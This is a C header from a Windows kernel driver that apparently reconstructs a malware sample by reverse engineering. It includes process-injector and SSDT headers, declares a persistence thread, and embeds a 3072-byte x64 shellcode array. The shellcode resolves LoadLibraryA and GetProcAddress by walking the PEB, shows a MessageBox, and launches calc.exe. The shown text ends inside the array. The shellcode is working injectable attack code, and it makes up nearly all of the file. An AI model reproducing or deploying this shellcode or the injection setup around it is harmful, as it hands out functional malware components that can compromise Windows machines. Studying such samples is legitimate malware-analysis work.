/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
							2023
Copyright (c) Fluxuss Cyber Tech Desenvolvimento de Software, SLU (FLUXUSS)
Copyright (c) Fluxuss Software Security, LLC

! Reversed Soruce code from the original malware and maybe not equivalent the original source code.
*/

#pragma once
#include <ntifs.h>
#include <ntstrsafe.h>
#include "ProcessHeuristics.h"
#include "NtOsSsdt.h"
#include "ProcessInjector.h"

HANDLE g_hThread;
HANDLE g_hThreadPersist;

unsigned char g_ucMyShellcode[ 3072 ] = {

	0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41,
	0x00, 0x00, 0x00, 0x00, 0x6B, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6E, 0x00,
	0x65, 0x00, 0x6C, 0x00, 0x33, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x64, 0x00,
	0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x56, 0x48, 0x8B, 0xF4, 0x48, 0x83,
	0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x05, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0xE6, 0x5E, 0xC3, 0x57, 0x48, 0x81, 0xEC, 0xE0, 0x01, 0x00, 0x00,
	0xB8, 0x6B, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xC8, 0x00, 0x00,
	0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xCA, 0x00,
	0x00, 0x00, 0xB8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xCC,
	0x00, 0x00, 0x00, 0xB8, 0x6E, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0xCE, 0x00, 0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,
	0x24, 0xD0, 0x00, 0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0xD2, 0x00, 0x00, 0x00, 0xB8, 0x33, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0xD4, 0x00, 0x00, 0x00, 0xB8, 0x32, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0xD6, 0x00, 0x00, 0x00, 0xB8, 0x2E, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x84, 0x24, 0xD8, 0x00, 0x00, 0x00, 0xB8, 0x64, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xDA, 0x00, 0x00, 0x00, 0xB8, 0x6C,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xDC, 0x00, 0x00, 0x00, 0xB8,
	0x6C, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xDE, 0x00, 0x00, 0x00,
	0x33, 0xC0, 0x66, 0x89, 0x84, 0x24, 0xE0, 0x00, 0x00, 0x00, 0xC6, 0x44,
	0x24, 0x50, 0x4C, 0xC6, 0x44, 0x24, 0x51, 0x6F, 0xC6, 0x44, 0x24, 0x52,
	0x61, 0xC6, 0x44, 0x24, 0x53, 0x64, 0xC6, 0x44, 0x24, 0x54, 0x4C, 0xC6,
	0x44, 0x24, 0x55, 0x69, 0xC6, 0x44, 0x24, 0x56, 0x62, 0xC6, 0x44, 0x24,
	0x57, 0x72, 0xC6, 0x44, 0x24, 0x58, 0x61, 0xC6, 0x44, 0x24, 0x59, 0x72,
	0xC6, 0x44, 0x24, 0x5A, 0x79, 0xC6, 0x44, 0x24, 0x5B, 0x41, 0xC6, 0x44,
	0x24, 0x5C, 0x00, 0xC6, 0x44, 0x24, 0x60, 0x47, 0xC6, 0x44, 0x24, 0x61,
	0x65, 0xC6, 0x44, 0x24, 0x62, 0x74, 0xC6, 0x44, 0x24, 0x63, 0x50, 0xC6,
	0x44, 0x24, 0x64, 0x72, 0xC6, 0x44, 0x24, 0x65, 0x6F, 0xC6, 0x44, 0x24,
	0x66, 0x63, 0xC6, 0x44, 0x24, 0x67, 0x41, 0xC6, 0x44, 0x24, 0x68, 0x64,
	0xC6, 0x44, 0x24, 0x69, 0x64, 0xC6, 0x44, 0x24, 0x6A, 0x72, 0xC6, 0x44,
	0x24, 0x6B, 0x65, 0xC6, 0x44, 0x24, 0x6C, 0x73, 0xC6, 0x44, 0x24, 0x6D,
	0x73, 0xC6, 0x44, 0x24, 0x6E, 0x00, 0xC6, 0x84, 0x24, 0xA0, 0x00, 0x00,
	0x00, 0x75, 0xC6, 0x84, 0x24, 0xA1, 0x00, 0x00, 0x00, 0x73, 0xC6, 0x84,
	0x24, 0xA2, 0x00, 0x00, 0x00, 0x65, 0xC6, 0x84, 0x24, 0xA3, 0x00, 0x00,
	0x00, 0x72, 0xC6, 0x84, 0x24, 0xA4, 0x00, 0x00, 0x00, 0x33, 0xC6, 0x84,
	0x24, 0xA5, 0x00, 0x00, 0x00, 0x32, 0xC6, 0x84, 0x24, 0xA6, 0x00, 0x00,
	0x00, 0x2E, 0xC6, 0x84, 0x24, 0xA7, 0x00, 0x00, 0x00, 0x64, 0xC6, 0x84,
	0x24, 0xA8, 0x00, 0x00, 0x00, 0x6C, 0xC6, 0x84, 0x24, 0xA9, 0x00, 0x00,
	0x00, 0x6C, 0xC6, 0x84, 0x24, 0xAA, 0x00, 0x00, 0x00, 0x00, 0xC6, 0x84,
	0x24, 0xB0, 0x00, 0x00, 0x00, 0x4D, 0xC6, 0x84, 0x24, 0xB1, 0x00, 0x00,
	0x00, 0x65, 0xC6, 0x84, 0x24, 0xB2, 0x00, 0x00, 0x00, 0x73, 0xC6, 0x84,
	0x24, 0xB3, 0x00, 0x00, 0x00, 0x73, 0xC6, 0x84, 0x24, 0xB4, 0x00, 0x00,
	0x00, 0x61, 0xC6, 0x84, 0x24, 0xB5, 0x00, 0x00, 0x00, 0x67, 0xC6, 0x84,
	0x24, 0xB6, 0x00, 0x00, 0x00, 0x65, 0xC6, 0x84, 0x24, 0xB7, 0x00, 0x00,
	0x00, 0x42, 0xC6, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x6F, 0xC6, 0x84,
	0x24, 0xB9, 0x00, 0x00, 0x00, 0x78, 0xC6, 0x84, 0x24, 0xBA, 0x00, 0x00,
	0x00, 0x57, 0xC6, 0x84, 0x24, 0xBB, 0x00, 0x00, 0x00, 0x00, 0xC6, 0x44,
	0x24, 0x70, 0x43, 0xC6, 0x44, 0x24, 0x71, 0x72, 0xC6, 0x44, 0x24, 0x72,
	0x65, 0xC6, 0x44, 0x24, 0x73, 0x61, 0xC6, 0x44, 0x24, 0x74, 0x74, 0xC6,
	0x44, 0x24, 0x75, 0x65, 0xC6, 0x44, 0x24, 0x76, 0x50, 0xC6, 0x44, 0x24,
	0x77, 0x72, 0xC6, 0x44, 0x24, 0x78, 0x6F, 0xC6, 0x44, 0x24, 0x79, 0x63,
	0xC6, 0x44, 0x24, 0x7A, 0x65, 0xC6, 0x44, 0x24, 0x7B, 0x73, 0xC6, 0x44,
	0x24, 0x7C, 0x73, 0xC6, 0x44, 0x24, 0x7D, 0x41, 0xC6, 0x44, 0x24, 0x7E,
	0x00, 0xC6, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x43, 0xC6, 0x84, 0x24,
	0x81, 0x00, 0x00, 0x00, 0x3A, 0xC6, 0x84, 0x24, 0x82, 0x00, 0x00, 0x00,
	0x5C, 0xC6, 0x84, 0x24, 0x83, 0x00, 0x00, 0x00, 0x57, 0xC6, 0x84, 0x24,
	0x84, 0x00, 0x00, 0x00, 0x69, 0xC6, 0x84, 0x24, 0x85, 0x00, 0x00, 0x00,
	0x6E, 0xC6, 0x84, 0x24, 0x86, 0x00, 0x00, 0x00, 0x64, 0xC6, 0x84, 0x24,
	0x87, 0x00, 0x00, 0x00, 0x6F, 0xC6, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00,
	0x77, 0xC6, 0x84, 0x24, 0x89, 0x00, 0x00, 0x00, 0x73, 0xC6, 0x84, 0x24,
	0x8A, 0x00, 0x00, 0x00, 0x5C, 0xC6, 0x84, 0x24, 0x8B, 0x00, 0x00, 0x00,
	0x73, 0xC6, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00, 0x79, 0xC6, 0x84, 0x24,
	0x8D, 0x00, 0x00, 0x00, 0x73, 0xC6, 0x84, 0x24, 0x8E, 0x00, 0x00, 0x00,
	0x74, 0xC6, 0x84, 0x24, 0x8F, 0x00, 0x00, 0x00, 0x65, 0xC6, 0x84, 0x24,
	0x90, 0x00, 0x00, 0x00, 0x6D, 0xC6, 0x84, 0x24, 0x91, 0x00, 0x00, 0x00,
	0x33, 0xC6, 0x84, 0x24, 0x92, 0x00, 0x00, 0x00, 0x32, 0xC6, 0x84, 0x24,
	0x93, 0x00, 0x00, 0x00, 0x5C, 0xC6, 0x84, 0x24, 0x94, 0x00, 0x00, 0x00,
	0x63, 0xC6, 0x84, 0x24, 0x95, 0x00, 0x00, 0x00, 0x61, 0xC6, 0x84, 0x24,
	0x96, 0x00, 0x00, 0x00, 0x6C, 0xC6, 0x84, 0x24, 0x97, 0x00, 0x00, 0x00,
	0x63, 0xC6, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x2E, 0xC6, 0x84, 0x24,
	0x99, 0x00, 0x00, 0x00, 0x65, 0xC6, 0x84, 0x24, 0x9A, 0x00, 0x00, 0x00,
	0x78, 0xC6, 0x84, 0x24, 0x9B, 0x00, 0x00, 0x00, 0x65, 0xC6, 0x84, 0x24,
	0x9C, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x48, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0xF8, 0x00, 0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0xFA, 0x00, 0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0xFC, 0x00, 0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x84, 0x24, 0xFE, 0x00, 0x00, 0x00, 0xB8, 0x6F, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x00, 0x01, 0x00, 0x00, 0xB8, 0x20,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x02, 0x01, 0x00, 0x00, 0xB8,
	0x57, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x04, 0x01, 0x00, 0x00,
	0xB8, 0x6F, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x06, 0x01, 0x00,
	0x00, 0xB8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x08, 0x01,
	0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x0A,
	0x01, 0x00, 0x00, 0xB8, 0x64, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0x0C, 0x01, 0x00, 0x00, 0xB8, 0x2C, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,
	0x24, 0x0E, 0x01, 0x00, 0x00, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0x10, 0x01, 0x00, 0x00, 0xB8, 0x46, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0x12, 0x01, 0x00, 0x00, 0xB8, 0x61, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0x14, 0x01, 0x00, 0x00, 0xB8, 0x7A, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x84, 0x24, 0x16, 0x01, 0x00, 0x00, 0xB8, 0x20, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x18, 0x01, 0x00, 0x00, 0xB8, 0x6F,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x1A, 0x01, 0x00, 0x00, 0xB8,
	0x20, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x1C, 0x01, 0x00, 0x00,
	0xB8, 0x46, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x1E, 0x01, 0x00,
	0x00, 0xB8, 0x21, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x20, 0x01,
	0x00, 0x00, 0x33, 0xC0, 0x66, 0x89, 0x84, 0x24, 0x22, 0x01, 0x00, 0x00,
	0xB8, 0x4B, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xE8, 0x00, 0x00,
	0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xEA, 0x00,
	0x00, 0x00, 0xB8, 0x6F, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xEC,
	0x00, 0x00, 0x00, 0xB8, 0x77, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0xEE, 0x00, 0x00, 0x00, 0xB8, 0x75, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,
	0x24, 0xF0, 0x00, 0x00, 0x00, 0xB8, 0x21, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0xF2, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x66, 0x89, 0x84, 0x24,
	0xF4, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xC8, 0x00, 0x00, 0x00,
	0xE8, 0x89, 0x03, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xC0, 0x00, 0x00,
	0x00, 0x48, 0x83, 0xBC, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x75, 0x0A,
	0xB8, 0x01, 0x00, 0x00, 0x00, 0xE9, 0x2B, 0x01, 0x00, 0x00, 0x48, 0x8D,
	0x54, 0x24, 0x50, 0x48, 0x8B, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xE8,
	0x22, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x28, 0x01, 0x00, 0x00,
	0x48, 0x83, 0xBC, 0x24, 0x28, 0x01, 0x00, 0x00, 0x00, 0x75, 0x0A, 0xB8,
	0x02, 0x00, 0x00, 0x00, 0xE9, 0xFC, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54,
	0x24, 0x60, 0x48, 0x8B, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xE8, 0xF3,
	0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0x48,
	0x83, 0xBC, 0x24, 0x30, 0x01, 0x00, 0x00, 0x00, 0x75, 0x0A, 0xB8, 0x03,
	0x00, 0x00, 0x00, 0xE9, 0xCD, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24,
	0x28, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x48, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24,
	0x38, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x70, 0x48, 0x8B, 0x8C,
	0x24, 0xC0, 0x00, 0x00, 0x00, 0xFF, 0x94, 0x24, 0x38, 0x01, 0x00, 0x00,
	0x48, 0x89, 0x84, 0x24, 0x40, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x84, 0x24,
	0x70, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x33, 0xC0, 0xB9, 0x68, 0x00,
	0x00, 0x00, 0xF3, 0xAA, 0xC7, 0x84, 0x24, 0x70, 0x01, 0x00, 0x00, 0x68,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x84, 0x24, 0x50, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0xF8, 0x33, 0xC0, 0xB9, 0x18, 0x00, 0x00, 0x00, 0xF3, 0xAA, 0x48,
	0x8D, 0x84, 0x24, 0x50, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48,
	0x48, 0x8D, 0x84, 0x24, 0x70, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24,
	0x40, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7,
	0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x00,
	0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x45,
	0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x8D, 0x8C, 0x24, 0x80,
	0x00, 0x00, 0x00, 0xFF, 0x94, 0x24, 0x40, 0x01, 0x00, 0x00, 0x33, 0xC0,
	0x83, 0xF8, 0x01, 0x74, 0x02, 0xEB, 0xF7, 0x33, 0xC0, 0x48, 0x81, 0xC4,
	0xE0, 0x01, 0x00, 0x00, 0x5F, 0xC3, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48,
	0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x8B, 0x84, 0x24,
	0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44,
	0x24, 0x30, 0x0F, 0xB7, 0x00, 0x3D, 0x4D, 0x5A, 0x00, 0x00, 0x74, 0x07,
	0x33, 0xC0, 0xE9, 0x02, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x30,
	0x48, 0x63, 0x40, 0x3C, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00,
	0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x40, 0xB8,
	0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24,
	0x40, 0x48, 0x8D, 0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x83, 0x38, 0x00, 0x75, 0x07,
	0x33, 0xC0, 0xE9, 0xBA, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x38,
	0x8B, 0x00, 0x89, 0x44, 0x24, 0x18, 0x8B, 0x44, 0x24, 0x18, 0x48, 0x03,
	0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48,
	0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x44, 0x24, 0x48,
	0x48, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x1C, 0x89, 0x44, 0x24, 0x24,
	0x48, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x20, 0x89, 0x44, 0x24, 0x1C,
	0x48, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x24, 0x89, 0x44, 0x24, 0x20,
	0x48, 0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0D, 0x48,
	0x8B, 0x44, 0x24, 0x08, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x08,
	0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x39, 0x44, 0x24, 0x08, 0x0F, 0x83,
	0x43, 0x01, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x1C, 0x48, 0x8B, 0x8C, 0x24,
	0x80, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B,
	0x4C, 0x24, 0x08, 0x48, 0x8D, 0x04, 0x88, 0x48, 0x89, 0x44, 0x24, 0x58,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00,
	0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x08, 0x48,
	0x8D, 0x04, 0x48, 0x48, 0x89, 0x44, 0x24, 0x50, 0x8B, 0x44, 0x24, 0x24,
	0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48,
	0x8B, 0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x0F, 0xB7, 0x09, 0x48, 0x8D,
	0x04, 0x88, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x58,
	0x8B, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0xC7, 0x04,
	0x24, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x04, 0x24, 0x00, 0x00, 0x00,
	0x00, 0xEB, 0x0B, 0x48, 0x8B, 0x04, 0x24, 0x48, 0xFF, 0xC0, 0x48, 0x89,
	0x04, 0x24, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x8B, 0x8C, 0x24, 0x88, 0x00,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x0F, 0xBE, 0x00, 0x85,
	0xC0, 0x74, 0x45, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x8B, 0x4C, 0x24, 0x28,
	0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x74,
	0x2F, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x8B, 0x8C, 0x24, 0x88, 0x00, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x0F, 0xBE, 0x00, 0x48, 0x8B,
	0x0C, 0x24, 0x48, 0x8B, 0x54, 0x24, 0x28, 0x48, 0x03, 0xD1, 0x48, 0x8B,
	0xCA, 0x0F, 0xBE, 0x09, 0x3B, 0xC1, 0x74, 0x02, 0xEB, 0x02, 0xEB, 0x97,
	0x48, 0x8B, 0x04, 0x24, 0x48, 0x8B, 0x8C, 0x24, 0x88, 0x00, 0x00, 0x00,
	0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x75,
	0x2D, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x75, 0x17, 0x48,
	0x8B, 0x44, 0x24, 0x60, 0x8B, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x07, 0xE9, 0xA0,
	0xFE, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78, 0xC3, 0x48, 0x89,
	0x4C, 0x24, 0x08, 0x56, 0x57, 0x48, 0x83, 0xEC, 0x68, 0x48, 0xC7, 0x44,
	0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60,
	0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24,
	0x30, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8D,
	0x44, 0x24, 0x48, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x8B, 0xF8, 0x48,
	0x8D, 0x71, 0x10, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x48, 0x8B,
	0x44, 0x24, 0x48, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24,
	0x40, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x83, 0x7C, 0x24, 0x20, 0x00,
	0x0F, 0x84, 0xC6, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x83, 0x78, 0x30, 0x00, 0x0F, 0x84, 0xB6, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x44, 0x24, 0x20, 0x48, 0x83, 0x78, 0x60, 0x00, 0x75, 0x02, 0xEB, 0xD6,
	0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x40, 0x60, 0x48, 0x89, 0x44,
	0x24, 0x18, 0x48, 0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7,
	0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0B, 0x48, 0x8B, 0x04, 0x24,
	0x48, 0xFF, 0xC0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x8B, 0x84, 0x24, 0x80,
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x85,
	0xC0, 0x0F, 0x84, 0x23, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x18,
	0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x85, 0xC0, 0x0F, 0x84,
	0x0E, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83, 0xF8, 0x5A, 0x7F,
	0x50, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0C,
	0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83, 0xF8, 0x41, 0x7C, 0x3B, 0x48, 0x8B,
	0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7,
	0x04, 0x48, 0x83, 0xE8, 0x41, 0x83, 0xC0, 0x61, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0C, 0x24,
	0x0F, 0xB7, 0x54, 0x24, 0x28, 0x66, 0x89, 0x14, 0x48, 0x0F, 0xB7, 0x44,
	0x24, 0x28, 0x66, 0x89, 0x44, 0x24, 0x08, 0xEB, 0x15, 0x48, 0x8B, 0x84,
	0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04,
	0x48, 0x66, 0x89, 0x44, 0x24, 0x08, 0x0F, 0xB7, 0x44, 0x24, 0x08, 0x66,
	0x89, 0x44, 0x24, 0x0C, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x48, 0x8B, 0x0C,
	0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83, 0xF8, 0x5A, 0x7F, 0x47, 0x48, 0x8B,
	0x44, 0x24, 0x18, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83,
	0xF8, 0x41, 0x7C, 0x35, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x48, 0x8B, 0x0C,
	0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83, 0xE8, 0x41, 0x83, 0xC0, 0x61, 0x89,
	0x44, 0x24, 0x2C, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x48, 0x8B, 0x0C, 0x24,
	0x0F, 0xB7, 0x54, 0x24, 0x2C, 0x66, 0x89, 0x14, 0x48, 0x0F, 0xB7, 0x44,
	0x24, 0x2C, 0x66, 0x89, 0x44, 0x24, 0x0A, 0xEB, 0x12, 0x48, 0x8B, 0x44,
	0x24, 0x18, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x66, 0x89,
	0x44, 0x24, 0x0A, 0x0F, 0xB7, 0x44, 0x24, 0x0A, 0x66, 0x89, 0x44, 0x24,
	0x10, 0x0F, 0xB7, 0x44, 0x24, 0x0C, 0x0F, 0xB7, 0x4C, 0x24, 0x10, 0x3B,
	0xC1, 0x74, 0x02, 0xEB, 0x05, 0xE9, 0xBA, 0xFE, 0xFF, 0xFF, 0x48, 0x8B,
	0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7,
	0x04, 0x48, 0x85, 0xC0, 0x75, 0x1C, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x48,
	0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x85, 0xC0, 0x75, 0x0B, 0x48,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x40, 0x30, 0xEB, 0x14, 0x48, 0x8B,
	0x44, 0x24, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0xE9,
	0x2E, 0xFE, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x68, 0x5F, 0x5E,
	0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
